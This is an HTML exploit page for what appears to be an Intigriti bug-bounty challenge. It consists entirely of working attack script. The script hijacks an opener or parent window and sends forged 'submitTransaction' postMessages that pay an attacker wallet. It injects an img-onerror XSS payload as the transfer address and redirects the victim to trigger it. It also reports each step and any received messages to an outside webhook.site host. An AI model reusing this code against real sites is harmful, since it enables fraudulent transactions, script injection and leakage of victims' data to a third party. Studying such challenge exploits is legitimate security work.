<!DOCTYPE html>
<html>
<head>
    <title>Intigriti 0126 - Exploit</title>
    <meta charset="UTF-8">
</head>
<body>
    <script>
        const WEBHOOK = 'https://webhook.site/a0c5dc4c-1b40-463c-95b6-64ea3c45809c';
        const YOUR_WALLET = '1cffcc33e631193cce307bda88be77345e';
        const BASE = 'https://challenge-0126.intigriti.io';
        const XSS_PAYLOAD = '<img src=x onerror="alert(\'gigawatz\')">';

        // Track everything
        function track(step, status, data = {}) {
            new Image().src = `${WEBHOOK}?step=${step}&status=${status}&ts=${Date.now()}&d=${encodeURIComponent(JSON.stringify(data))}`;
            console.log(step, status, data);
        }

        track('start', 'loaded', { location: window.location.href });

        // STRATEGY 1: If bot opened us as popup/iframe, use window.opener or window.parent
        if (window.opener && !window.opener.closed) {
            track('found_opener', 'success', {});

            // Redirect opener to checkout
            window.opener.location = `${BASE}/checkout.html?currency=1337COIN&price=1`;

            // Wait for checkout to load, then send postMessage
            setTimeout(() => {
                track('sending_to_opener', 'start', {});

                window.opener.postMessage({
                    type: 'submitTransaction',
                    transaction: {
                        toAddress: YOUR_WALLET,
                        currency: '1337COIN',
                        amount: 1337
                    }
                }, '*');

                track('tx1_sent', 'done', {});

                window.opener.postMessage({
                    type: 'submitTransaction',
                    transaction: {
                        toAddress: XSS_PAYLOAD,
                        currency: '1337COIN',
                        amount: 1337
                    }
                }, '*');

                track('tx2_sent', 'done', {});

                // Redirect to marketwatch to trigger XSS
                setTimeout(() => {
                    window.opener.location = `${BASE}/marketwatch.html`;
                    track('redirected', 'done', {});
                }, 3000);
            }, 8000);
        }
        // STRATEGY 2: window.parent (iframe case)
        else if (window.parent && window.parent !== window) {
            track('found_parent', 'success', {});

            window.parent.location = `${BASE}/checkout.html?currency=1337COIN&price=1`;

            setTimeout(() => {
                track('sending_to_parent', 'start', {});

                window.parent.postMessage({
                    type: 'submitTransaction',
                    transaction: {
                        toAddress: YOUR_WALLET,
                        currency: '1337COIN',
                        amount: 1337
                    }
                }, '*');

                track('tx1_sent', 'done', {});

                window.parent.postMessage({
                    type: 'submitTransaction',
                    transaction: {
                        toAddress: XSS_PAYLOAD,
                        currency: '1337COIN',
                        amount: 1337
                    }
                }, '*');

                track('tx2_sent', 'done', {});

                setTimeout(() => {
                    window.parent.location = `${BASE}/marketwatch.html`;
                    track('redirected', 'done', {});
                }, 3000);
            }, 8000);
        }
        // STRATEGY 3: No opener/parent - try redirecting this tab
        else {
            track('no_opener_parent', 'redirecting_self', {});

            // Store data in localStorage
            try {
                localStorage.setItem('exploit_wallet', YOUR_WALLET);
                localStorage.setItem('exploit_xss', XSS_PAYLOAD);
                localStorage.setItem('exploit_webhook', WEBHOOK);
            } catch(e) {}

            // Redirect to a page that will execute our exploit
            window.location.href = `${BASE}/checkout.html?currency=1337COIN&price=1&exploit=1`;
        }

        // Listen for messages
        window.addEventListener('message', (event) => {
            track('msg_received', 'info', event.data);
        });
    </script>
</body>
</html>
